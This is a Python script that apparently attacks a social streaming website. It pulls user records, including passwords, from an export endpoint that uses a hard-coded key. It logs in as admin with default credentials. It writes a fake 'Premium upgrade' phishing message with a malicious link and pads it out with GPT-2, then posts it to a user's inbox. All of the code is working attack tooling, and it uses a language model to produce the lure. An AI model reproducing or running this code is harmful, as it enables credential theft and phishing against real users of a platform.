import requests
import json
import random
import pandas as pd
from transformers import GPT2LMHeadModel, GPT2Tokenizer
import torch
import os
from urllib.parse import urlparse

# ---------- PART 1: Extract users from API ----------

def get_users_from_api():
    url = "http://209.38.160.133/social_streaming/api/export_users.php?key=dev123"
    response = requests.get(url)
    users = []

    if response.status_code == 200:
        data = response.json()
        for user in data:
            user_info = {
                "username": user.get("username", ""),
                "email": user.get("email", ""),
                "password": user.get("password", ""),
                "bio": user.get("bio", ""),
                "profile_picture": user.get("profile_picture", ""),
                "stream_video": user.get("stream_video", ""),
                "credits": user.get("credits", ""),
                "name": user.get("name", ""),
                "country": user.get("country", ""),
                "subscription_type": user.get("subscription_type", ""),
                "preferred_genre": user.get("preferred_genre", ""),
                "last_login": user.get("last_login", "")
            }
            users.append(user_info)
    else:
        print(f"[!] Failed to retrieve users. Status code: {response.status_code}")
    return users

# ---------- PART 2: Generate phishing message ----------

def load_gpt2_model():
    tokenizer = GPT2Tokenizer.from_pretrained("gpt2")
    model = GPT2LMHeadModel.from_pretrained("gpt2")
    model.eval()
    return tokenizer, model

def find_top_creators(user_genre, youtubers, mapping, num_creators=3):
    categories = mapping.get(user_genre, [])
    if not categories:
        return []
    filtered = youtubers[youtubers['category'].isin(categories)]
    top_creators = filtered.sort_values(by='subscribers', ascending=False).head(num_creators)
    return top_creators['Youtuber'].tolist()

def create_phishing_prompt(user, top_creators):
    malicious_link = "http://209.38.160.133/social_streaming_exclusive_offers/"
    if not top_creators:
        return f"Dear {user['name']},\n\nUnfortunately, we couldn't find content matching your preferences."

    return f"""
    Dear {user['name']},

    We have exciting updates for you! Your **{user['preferred_genre']}** subscription has been upgraded to **Premium**. 
    Click below to enjoy exclusive content from top creators like {', '.join(top_creators)}. 

    Don't miss out on new videos, hot releases, and special perks only available for premium users.

    {malicious_link}

    Best regards,
    Site Admin
    """

# ---------- PART 3: Send the phishing message ----------

def send_message_to_user(session, email_content, receiver_id=1):
    send_message_url = "http://209.38.160.133/social_streaming/send_message.php"
    payload = {
        'receiver_id': receiver_id,
        'message': email_content
    }
    print(f"[*] Sending message to user ID {receiver_id}...")
    send_response = session.post(send_message_url, data=payload, allow_redirects=True)

    if "inbox.php" in send_response.url:
        print(f"[+] Message sent successfully to user {receiver_id}!")
    else:
        print("[-] Message may not have been sent. Response:\n", send_response.text)

def login_and_send_message(generated_email):
    login_url = "http://209.38.160.133/social_streaming/login_process.php"
    login_data = {
        "username": "admin",
        "password": "123456"
    }

    generated_email = generated_email.strip()

    with requests.Session() as session:
        print("[*] Attempting login...")
        login_response = session.post(login_url, data=login_data)
        if login_response.status_code == 200 and "login failed" not in login_response.text.lower():
            print("[+] Logged in successfully!")
            send_message_to_user(session, generated_email)
        else:
            print("[-] Login failed. Check credentials or login structure.")

# ---------- Main Execution Block ----------

if __name__ == "__main__":
    users = get_users_from_api()
    if not users:
        exit("[!] No users retrieved.")

    # Skip first 12 users
    users = users[12:]

    if not users:
        exit("[!] No users left after skipping first 12.")

    if not os.path.exists("most_subscribed_youtube_channels.csv"):
        exit("[!] Dataset 'most_subscribed_youtube_channels.csv' not found.")
    youtubers = pd.read_csv("most_subscribed_youtube_channels.csv")

    genre_to_category_mapping = {
        'Drama': ['Film & Animation', 'Shows'],
        'Sci-Fi': ['Film & Animation', 'Education'],
        'Comedy': ['Film & Animation', 'Comedy'],
        'Romance': ['Film & Animation'],
        'Action': ['Film & Animation'],
        'Documentary': ['Documentary'],
        'Horror': ['Film & Animation', 'Horror'],
        'Music': ['Music'],
        'Education': ['Education'],
        'News': ['People & Blogs'],
        'Thriller': ['Film & Animation', 'Entertainment']
    }

    user = random.choice(users)
    top_creators = find_top_creators(user['preferred_genre'], youtubers, genre_to_category_mapping)

    tokenizer, model = load_gpt2_model()
    phishing_prompt = create_phishing_prompt(user, top_creators)
    inputs = tokenizer.encode(phishing_prompt, return_tensors="pt")

    with torch.no_grad():
        outputs = model.generate(
            inputs,
            attention_mask=torch.ones_like(inputs),
            max_new_tokens=80,
            temperature=0.9,
            top_p=0.95,
            do_sample=True,
            num_return_sequences=1,
            pad_token_id=tokenizer.eos_token_id
        )

    generated_email = tokenizer.decode(outputs[0], skip_special_tokens=True)
    print("\nGenerated Phishing Email:\n")
    print(generated_email)

    login_and_send_message(generated_email)
